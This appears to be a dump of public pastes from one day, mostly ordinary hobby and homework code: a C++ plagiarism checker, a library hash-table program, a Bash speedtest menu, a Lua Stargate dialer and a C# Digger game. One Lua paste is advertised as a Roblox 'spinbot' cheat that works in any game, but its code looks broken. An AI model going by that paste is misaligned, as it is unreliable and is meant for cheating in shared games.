bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")
bt.Form.Dublicate(""RekQtelJpjqo29"")"
DNuUdHRg,"ROBLOX SPINBOT (FE, WORK IN ANY GAME) v4 version",whileDo,Lua,Sunday 24th of December 2023 08:43:49 AM CDT,"local humanoid = game.Workspace:WaitForChild(""YourPlayerName"").Humanoid

humanoid.MaxTorque = Vector3.new(0, 400000, 0)

while true do
    humanoid.Torso.CFrame = humanoid.Torso.CFrame * CFrame.Angles(0, math.rad(50), 0)
    wait()
end
"
LiHaZ6wc,Untitled,cyberjab,C++,Sunday 24th of December 2023 08:24:50 AM CDT,"//#pragma GCC optimize(""03"")
//#pragma GCC target(""sse,sse2,sse3,ssse3,sse4,popcnt,abm,mmx,avx,tune=native"")
#include <iostream>
#include <iomanip>
#include <cstdlib>
#include <cstdio>
#include <string>
#include <vector>
#include <map>
#include <set>
#include <unordered_map>
#include <unordered_set>
#include <queue>
#include <deque>
#include <cmath>
#include <numeric>
#include <algorithm>
#include <ctime>
#include <chrono>
#include <random>
#include <functional>
#include <fstream>

using namespace std;
const int MOD = 1e9 + 7;
const int xx = 257;

vector<long long> x = {1};

bool isequal(int from1, int from2, int len, vector<long long> h, vector<long long> x, vector<long long> h2) {
    return (h[from1 + len - 1] + h2[from2 - 1] * x[len]) % MOD ==
        (h2[from2 + len - 1] + h[from1 - 1] * x[len]) % MOD;
}

void make_x_koefs(int n) {
    int k = x.size();
    if (n + 1 > k) {
        x.resize(n + 1);
    }
    for (int i = k; i < n + 1; i++) {
        x[i] = (x[i - 1] * xx) % MOD;
    }
}

vector <long long> make_polynom(string s) {
    s = "" "" + s;
    vector <long long> h(s.size(), 0);
    for (int i = 1; i < s.size(); i++) {
        h[i] = (h[i - 1] * xx + s[i]) % MOD;
    }
    return h;
}

vector <string> read_tests(string fname) {
    fstream tests;
    tests.open(fname, ios::in);
    vector <string> ts;
    if (!tests.is_open()) {
        return ts;
    }
    string s;
    while (tests >> s) {
        ts.push_back(s);
    }
    tests.close();
    return ts;
}

string read_text(string fname) {
    fstream Text_to_check;
    Text_to_check.open(fname, ios::in);
    string text_s;
    if (!Text_to_check.is_open()) {
        return text_s;
    }
    string s;
    while (!Text_to_check.eof()) {
        getline(Text_to_check, s);
        text_s += s;
        if (!Text_to_check.eof()) {
            text_s += ' ';
        }
    }
    Text_to_check.close();
    return text_s;
}

int main() {
    ios_base::sync_with_stdio(0);
    cin.tie(0);
    cout << setprecision(2);
    cout << fixed;
    setlocale(LC_ALL, ""RU"");
    string cmd = ""?"";
    string message = ""*****************************************\nСписок команд:\nquit - выход\nload_text - выбрать текст для проверки\n"";
    message += ""load_tests - загрузить тесты на плагиат\n? - справка\ncheck - проверить текст\n"";
    message += ""*****************************************\n"";
    string text = """";
    vector<string> tests = {};
    string error = ""Ошибка!\n"";
    bool txt = false;
    bool tst = false;
    int N = 0;
    while (cmd != ""quit"") {
        if (cmd == ""?"") {
            cout << message;
        }
        else if (cmd == ""load_text"") {
            try {
                cout << ""Введите имя файла с расширением: "";
                string x;
                cin >> x;
                text = read_text(x);
                if (text != """") {
                    N = text.size();
                    txt = true;
                }
                else {
                    cout << ""Файл пуст!\n"";
                }
            }
            catch (...) {
                cout << error;
            }
        }
        else if (cmd == ""load_tests"") {
            try {
                cout << ""Введите имя файла с расширением: "";
                string x;
                cin >> x;
                tests = read_tests(x);
                if (!tests.empty()) {
                    tst = true;
                }
                else {
                    cout << ""Файл пуст!\n"";
                }
            }
            catch (...) {
                cout << error;
            }
        }
        else if (cmd == ""check"") {
            if (txt and tst) {
                make_x_koefs(N + 1);
                vector <long long> h = make_polynom(text);
                long long len_same = 0;
                bool flag = true;
                vector<vector <long long>> testsll;
                for (auto now : tests) {
                    if (now.size() > N) {
                        cout << ""Тест длиннее текста!\n"";
                        flag = false;
                        break;
                    }
                    testsll.push_back(make_polynom(now));
                }
                text = "" "" + text;
                for (int i = 1; i < text.size(); i++) {
                    for (int j = 0; j < testsll.size(); j++) {
                        if (i + testsll[j].size() - 1 < text.size()) {
                            if (isequal(i, 1, testsll[j].size() - 1, h, x, testsll[j])) {
                                len_same += testsll[j].size() - 1;
                            }
                        }
                    }
                }
                cout << ""Процент плагиата:"" << (long double)len_same / (text.size() - 1) * 100 << ""%\n"";
            }
            else {
                cout << ""Не выбран текст или тесты!\n"";
            }
        }
        else {
            cout << error;
        }
        cin >> cmd;
    }
}"
GpbE2VQ8,Event,RizoBoy,HTML,Sunday 24th of December 2023 08:20:01 AM CDT,"<align=""center"">
<size=40><color=#fcff03>Kyle's project</color> <b>/</b> <color=#FF00FF>Ивенты</color></size>
<b><size=16>Сервер с <color=#FB9800>20+</color> автоматическими ивентами</size>\n<color=#C0C0C0>[CIS ONLY]</color></b>
</align>

<size=17><link=""https://github.com/KoT0XleB/AutoEvent/blob/main/Docs/MiniGames.md""><mark=#FF00FF><size=13>|📃|</size></mark><mark=#595959>||</mark><mark=#4F4F4F> Список ивентов|<space=6.35em>|</mark></link></size>

<size=17><link=""https://docs.google.com/document/d/1C3bFwA8Wo18ZTuckRfkZcv3wthr6YB7SsGrX919SzRE""><mark=#E31C1C><size=13>|📖|</size></mark><mark=#595959>||</mark><mark=#4F4F4F> Общие Правила|<space=6.35em>|</mark></link></size>

<size=17><link=""https://docs.google.com/forms/d/e/1FAIpQLScVBwr7aeuOPD_olkjw_dqH-o2yftto8g9EjFvx4gVaAGsdYQ/viewform""><mark=#FF8C00><size=13>|📋|</size></mark><mark=#595959>||</mark><mark=#4F4F4F> Заявка на Администратора|<space=0.85em>|</mark></link></size>

<size=17><link=""https://discord.gg/uxfhSG2""><mark=#32CD32><size=13>|💬|</size></mark><mark=#595959>||</mark><mark=#4F4F4F> Дискорд сервер|<space=6.2em>|</mark></link></size>

<size=17><link=""https://kyles.ru/""><mark=#2297E6><size=13>|🌐|</size></mark><mark=#595959>||</mark><mark=#4F4F4F> Сайт|<space=11.6em>|</mark></link></size>

<size=17><link=""https://docs.google.com/document/d/1yKABCtmIdKt78jm_rkbfQoxhAKLVRRltagroYD_rldE""><mark=#4c00ff><size=13>|💎|</size></mark><mark=#595959>||</mark><mark=#4F4F4F> Донат-привилегии|<space=5.1em>|</mark></link></size>
</align>

<size=0>.</size>"
P4ZA3ZHC,Изменения,LeonMarkelov,Pawn,Sunday 24th of December 2023 08:09:08 AM CDT,OnDeath
zqvFCMwg,tugas kelompok strukdat,firzaelbuho,C++,Sunday 24th of December 2023 08:07:00 AM CDT,"#include <iostream>
#include <iomanip>
#include <cstring>
#include <cstdlib>

using namespace std;



// Struktur data untuk buku
struct Buku {
    char judul[50];
    char penulis[50];
    int nomorReferensi;
    Buku* next;
};

// Struktur data hash
const int HASH_SIZE = 10;
Buku* hashTable[HASH_SIZE] = {nullptr};

// Struktur data pohon telusur biner
struct Node {
    Buku* data;
    Node* left;
    Node* right;
};

// Fungsi hash untuk mendapatkan indeks hash
int hashFunction(int nomorReferensi) {
    return nomorReferensi % HASH_SIZE;
}

// Fungsi untuk menyisipkan buku ke dalam struktur hash
void sisipkanBuku(Buku* buku) {
    int index = hashFunction(buku->nomorReferensi);
    buku->next = hashTable[index];
    hashTable[index] = buku;
}

// Fungsi untuk menampilkan data buku dengan menggunakan struktur hash
void tampilkanDataBuku() {
    cout << left << setw(25) << ""Judul"" << setw(20) << ""Penulis"" << setw(15) << ""Nomor Referensi"" << endl;
    cout << setfill('-') << setw(60) << ""-"" << setfill(' ') << endl;

    for (int i = 0; i < HASH_SIZE; ++i) {
        Buku* current = hashTable[i];
        while (current != nullptr) {
            cout << left << setw(25) << current->judul << setw(20) << current->penulis << setw(15) << current->nomorReferensi << endl;
            current = current->next;
        }
    }
    cout << endl;
}

// Fungsi untuk menyisipkan data buku ke dalam pohon telusur biner
Node* sisipkanKePohon(Node* root, Buku* buku) {
    if (root == nullptr) {
        root = new Node;
        root->data = new Buku; // Allocated new Buku for root->data
        strcpy(root->data->judul, buku->judul);
        strcpy(root->data->penulis, buku->penulis);
        root->data->nomorReferensi = buku->nomorReferensi;
        root->left = root->right = nullptr;
    } else {
        if (strcmp(buku->judul, root->data->judul) < 0) {
            root->left = sisipkanKePohon(root->left, buku);
        } else {
            root->right = sisipkanKePohon(root->right, buku);
        }
    }
    return root;
}

// Fungsi untuk menampilkan data buku berdasarkan urutan judul (in-order)
void tampilkanInOrder(Node* root) {
    if (root != nullptr) {
        tampilkanInOrder(root->left);
        cout << left << setw(25) << root->data->judul << setw(20) << root->data->penulis << setw(15) << root->data->nomorReferensi << endl;
        tampilkanInOrder(root->right);
    }
}

// Fungsi untuk mencari buku berdasarkan nomor referensi menggunakan hash
Buku* cariBukuByNomorReferensi(int nomorReferensi) {
    int index = hashFunction(nomorReferensi);
    Buku* current = hashTable[index];
    while (current != nullptr) {
        if (current->nomorReferensi == nomorReferensi) {
            return current;
        }
        current = current->next;
    }
    return nullptr;
}

// Fungsi untuk mencari buku berdasarkan rentang judul menggunakan pohon telusur biner
void cariBukuByRentangJudul(Node* root, const char judulAwal[], const char judulAkhir[]) {
   

    if (root != nullptr) {
        if (strcmp(root->data->judul, judulAwal) >= 0 && strcmp(root->data->judul, judulAkhir) <= 0) {
            cout << left << setw(25) << root->data->judul << setw(20) << root->data->penulis << setw(15) << root->data->nomorReferensi << endl;
        }
        if (strcmp(root->data->judul, judulAwal) > 0) {
            cariBukuByRentangJudul(root->left, judulAwal, judulAkhir);
        }
        if (strcmp(root->data->judul, judulAkhir) < 0) {
            cariBukuByRentangJudul(root->right, judulAwal, judulAkhir);
        }
    }
}

// Fungsi untuk menghapus buku dari struktur hash
void hapusBuku(int nomorReferensi, Node*& pohonTelusurBiner, Node*& historyRoot, int hashIndex) {
    Buku* current = hashTable[hashIndex];
    Buku* prev = nullptr;

    while (current != nullptr && current->nomorReferensi != nomorReferensi) {
        prev = current;
        current = current->next;
    }

    if (current == nullptr) {
        cout << ""Buku tidak ditemukan.\n"";
        return;
    }

    if (prev == nullptr) {
        hashTable[hashIndex] = current->next;
    } else {
        prev->next = current->next;
    }

    // Sisipkan ke dalam history
    historyRoot = sisipkanKePohon(historyRoot, current); // <-- Perbaikan disini

    delete current;
}

// Fungsi untuk menampilkan history perpustakaan (in-order)
void tampilkanHistory(Node* root, int isFirst = true) {
    

    if (root != nullptr) {
        tampilkanHistory(root->left, false);
        
        cout << left << setw(25) << root->data->judul << setw(20) << root->data->penulis << setw(15) << root->data->nomorReferensi << endl;
        
        if(isFirst){
             tampilkanHistory(root->right, false);
        }
       
    }
}


// Fungsi utama
int main() {

    Node* pohonTelusurBiner = nullptr;
    Node* historyRoot = nullptr;
    // int deleteCount = 0;
    
    

    while (true) {
        cout << ""Menu:\n"";
        cout << ""1. Input Buku\n"";
        cout << ""2. Tampilkan Buku\n"";
        cout << ""3. Tampilkan Buku berdasarkan Judul (Ascending)\n"";
        cout << ""4. Cari Buku berdasarkan Nomor Referensi\n"";
        cout << ""5. Cari Buku berdasarkan Rentang Judul\n"";
        cout << ""6. Hapus Data Buku\n"";
        cout << ""7. Lihat History\n"";
        cout << ""8. Keluar\n"";
        cout << ""Pilih menu: "";

        int pilihan;
        cin >> pilihan;

        switch (pilihan) {
            case 1: {
                Buku* bukuBaru = new Buku;
                cout << ""Judul: "";
                cin.ignore();
                cin.getline(bukuBaru->judul, sizeof(bukuBaru->judul));
                cout << ""Penulis: "";
                cin.getline(bukuBaru->penulis, sizeof(bukuBaru->penulis));
                cout << ""Nomor Referensi: "";
                cin >> bukuBaru->nomorReferensi;

                sisipkanBuku(bukuBaru);
                pohonTelusurBiner = sisipkanKePohon(pohonTelusurBiner, bukuBaru);
                break;
            }
            case 2:
                tampilkanDataBuku();
                break;
            case 3:
                cout << ""Pengurutan Buku berdasarkan Judul (Ascending):\n"";
                cout << left << setw(25) << ""Judul"" << setw(20) << ""Penulis"" << setw(15) << ""Nomor Referensi"" << endl;
                cout << setfill('-') << setw(60) << ""-"" << setfill(' ') << endl;
                tampilkanInOrder(pohonTelusurBiner);
                cout << endl;
                break;
            case 4: {
                int nomorReferensi;
                cout << ""Masukkan Nomor Referensi: "";
                cin >> nomorReferensi;
                Buku* hasilCari = cariBukuByNomorReferensi(nomorReferensi);
                if (hasilCari != nullptr) {
                    cout << ""Buku ditemukan!\n"";
                    cout << ""Judul: "" << hasilCari->judul << "", Penulis: "" << hasilCari->penulis << "", Nomor Referensi: "" << hasilCari->nomorReferensi << endl;
                } else {
                    cout << ""Buku tidak ditemukan.\n"";
                }
                break;
            }
            case 5: {
                char judulAwal[50], judulAkhir[50];
                cout << ""Masukkan Rentang Judul (Awal): "";
                cin.ignore();
                cin.getline(judulAwal, sizeof(judulAwal));
                cout << ""Masukkan Rentang Judul (Akhir): "";
                cin.getline(judulAkhir, sizeof(judulAkhir));

                cout << ""Hasil Pencarian dalam Rentang Judul:\n"";
                cout << left << setw(25) << ""Judul"" << setw(20) << ""Penulis"" << setw(15) << ""Nomor Referensi"" << endl;
                cout << setfill('-') << setw(60) << ""-"" << setfill(' ') << endl;
                cariBukuByRentangJudul(pohonTelusurBiner, judulAwal, judulAkhir);
                cout << endl;
                break;
            }
            case 6: {
                int nomorReferensi;
                cout << ""Masukkan Nomor Referensi Buku yang akan dihapus: "";
                cin >> nomorReferensi;
                Buku* bukuDihapus = cariBukuByNomorReferensi(nomorReferensi);
                if (bukuDihapus != nullptr) {
                    int hashIndex = hashFunction(nomorReferensi);
                    hapusBuku(nomorReferensi, pohonTelusurBiner, historyRoot, hashIndex);
                    // deleteCount += 1;
                    historyRoot = sisipkanKePohon(historyRoot, bukuDihapus); // Masukkan ke history
                    cout << ""Buku berhasil dihapus.\n"";
                } else {
                    cout << ""Buku tidak ditemukan.\n"";
                }
                break;
            }
            case 7:
                cout << ""History Perpustakaan (In-Order):\n"";
                cout << ""( abaikan data terbawah )\n"";
                cout << left << setw(25) << ""Judul"" << setw(20) << ""Penulis"" << setw(15) << ""Nomor Referensi"" << endl;
                cout << setfill('-') << setw(60) << ""-"" << setfill(' ') << endl;
                tampilkanHistory(historyRoot);
                cout << endl;
                break;
            case 8:
                // Keluar dari program
                return 0;
            default:
                cout << ""Pilihan tidak valid.\n"";
        }

    }

    return 0;
}
"
0ABYLsGR,OnDeath,LeonMarkelov,Pawn,Sunday 24th of December 2023 08:05:18 AM CDT,"stock OnDeath(playerid)
{
	
	SetPlayerTeam(playerid, 1);
	SetPlayerSkillsInit(playerid);"
BLTytKGt,Speedtest Menu,KiLLerBoy_001,Bash,Sunday 24th of December 2023 07:51:45 AM CDT,"
#  ID{TABx1} Type{TABx2}Server

options=(
""1	 Ookla		KPN Amstelveen""
""2	 Ookla		KPN Barendrecht""  
""3	 Ookla		Jonaz Amersfoort""  
""4	 Ookla		Automatisch""
""5	 Iperf3		AMS1""
""6	 Iperf3		AMS2""
)

while item=$(zenity --title=""KPN Speedtest"" --text=""Kies een van de onderstaande Speedtest opties \nof tik het cijfer bij ID en druk Enter"" --list \
               --column=""ID	Type	Server"" ""${options[@]}"" --width=800 --height=500 --ok-label=""Test"" --cancel-label=""Exit"" ) 
do
    case ""$item"" in
        ""${options[0]}"")speedtest -s 61186;;
        ""${options[1]}"")speedtest -s 53438;;
        ""${options[2]}"")speedtest -s 10644;;
        ""${options[3]}"")speedtest;;       
        ""${options[4]}"")iperf3 -c speedtest.ams1.nl.leaseweb.net -p 5201-5210;;         
        ""${options[5]}"")iperf3 -c speedtest.ams2.nl.leaseweb.net -p 5201-5210;;
        
        *) echo ""Ooops! Invalid $item,option."";;
    esac
done





"
1kYU04Nd,MilkyWayStargateDialing,Heality,Lua,Sunday 24th of December 2023 07:47:34 AM CDT,"interface = peripheral.find(""basic_interface"")
--This finds some interface connected to the
--computer network, but since that one is the only
--one connected, it will always be that one near the gate

function dial(address)
--Milky Way Stargate is a special case when it comes
--to dialing
    
    local addressLength = #address
    --You don't really need to have this variable,
    --I just like to use lots of variables with
    --names to make everything immediately clear
    
    local start = interface.getChevronsEngaged() + 1
    --This is a helpful variable we'll be using to
    --make resuming dialing easier.
    --Basically what this does is it makes the computer
    --check how many chevrons are engaged and start from
    --the next one (that's why there's a +1)
    
    for chevron = start,addressLength,1
    do
        --This is a loop that will go through all the
        --symbols in an address
        
        local symbol = address[chevron]
        
        if chevron % 2 == 0 then
            interface.rotateClockwise(symbol)
        else
            interface.rotateAntiClockwise(symbol)
        end
        --Here we're basically making sure the gate ring
        --rotates clockwise when the number of chevrons
        --engaged is even and counter-clockwise when odd
        
        while(not interface.isCurrentSymbol(symbol))
        do
            sleep(0)
        end
        --This effectively ensures the program doesn't
        --do anything else and lets the dialing finish
        --rotating to the correct symbol
        
        sleep(1)
        --We want to wait 1 second before we
        --engage the chevron
        interface.raiseChevron() --This raises the chevron
        sleep(1)
        interface.lowerChevron() -- and this lowers it
        sleep(1)
        
        --Note that from many of the functions here,
        --you can get Stargate Feedback
        
        --For example, the raiseChevron() function will output
        --a number corresponding to some feedback value which you'll
        --be able to find in the video description
        
    end 
end

--Now that we've got a function, this is how we'll run it

--But first we want some addresses

abydosAddress = {26,6,14,31,11,29,0}
--Do note that the Point of Origin (number 0)
--is considered a part of the address
--and if you forget it, the dialing sequence
--will not finish
chulakAddress = {8,1,22,14,36,19,0}

lanteaAddress = {18,20,1,15,14,7,19,0}

--Now let's write the actual part of the program
--that will start the dialing

print(""Avaiting input:"")

print(""1 = Abydos"")
print(""2 = Chulak"")
print(""3 = Lantea"")
--These only tell the computer to write these
--strings of words when we run this program

input = tonumber(io.read())
sleep(0)
--Here we're basically getting the number written
--by the player on the console

if input == 1 then
    dial(abydosAddress) --We're using the function we wrote earlier
elseif input == 2 then
    dial(chulakAddress)
elseif input == 3 then
    dial(lanteaAddress)
else
    print(""Invalid input"")
end

--If you want to add more addresses, just
--add them to other addresses and extend this block

--You can do a bunch of other stuff with all this,
--but let's test it out now"
aKQvnHS2,Untitled,AttackingDirectory,C#,Sunday 24th of December 2023 07:42:22 AM CDT,"### ЗЕМЛЯ И ДИГГЕР

using System;
using Avalonia.Input;
using Digger.Architecture;

namespace Digger;

public class Terrain : ICreature
{
    public string GetImageFileName()
    {
        return ""Terrain.png"";
    }

    public bool DeadInConflict(ICreature conflictObj)
    {
        return true;
    }

    public int GetDrawingPriority()
    {
        return 0;
    }

    public CreatureCommand Act(int x, int y)
    {
        return new CreatureCommand { DeltaX = 0, DeltaY = 0 };
    }
}

public class Player : ICreature
{
    public string GetImageFileName()
    {
        return ""Digger.png"";
    }

    public bool DeadInConflict(ICreature conflictObj)
    {
        return false;
    }

    public int GetDrawingPriority()
    {
        return 1;
    }

    public CreatureCommand Act(int x, int y)
    {
        var key = Game.KeyPressed;
		var command = new CreatureCommand { DeltaX = 0, DeltaY = 0 };

        switch (key)
        {
            case Key.Down:
                if (y < Game.MapHeight - 1)
                {
                    command.DeltaY = 1;
                }
                break;

            case Key.Up:
                if (y > 0)
                {
                    command.DeltaY = -1;
                }
                break;

            case Key.Left:
                if (x > 0)
                {
                    command.DeltaX = -1;
                }
                break;

            case Key.Right:
                if (x < Game.MapWidth - 1)
                {
                    command.DeltaX = 1;
                }
                break;
        }

        return command;
    }
}

## Мешки и золото

using System;
using System.Diagnostics.Metrics;
using System.Threading;
using Avalonia.Input;
using Digger.Architecture;

namespace Digger;

public class Terrain : ICreature
{
    public string GetImageFileName()
    {
        return ""Terrain.png"";
    }

    public bool DeadInConflict(ICreature conflictObj)
    {
        return true;
    }

    public int GetDrawingPriority()
    {
        return 0;
    }

    public CreatureCommand Act(int x, int y)
    {
        return new CreatureCommand { DeltaX = 0, DeltaY = 0 };
    }
}

public class Gold : ICreature
{
    public string GetImageFileName()
    {
        return ""Gold.png"";
    }

    public int GetDrawingPriority()
    {
        return 4;
    }

    public CreatureCommand Act(int x, int y)
    {
        return new CreatureCommand { DeltaX = 0, DeltaY = 0 } ;
    }

    public bool DeadInConflict(ICreature conflictObj)
    {
        return true;
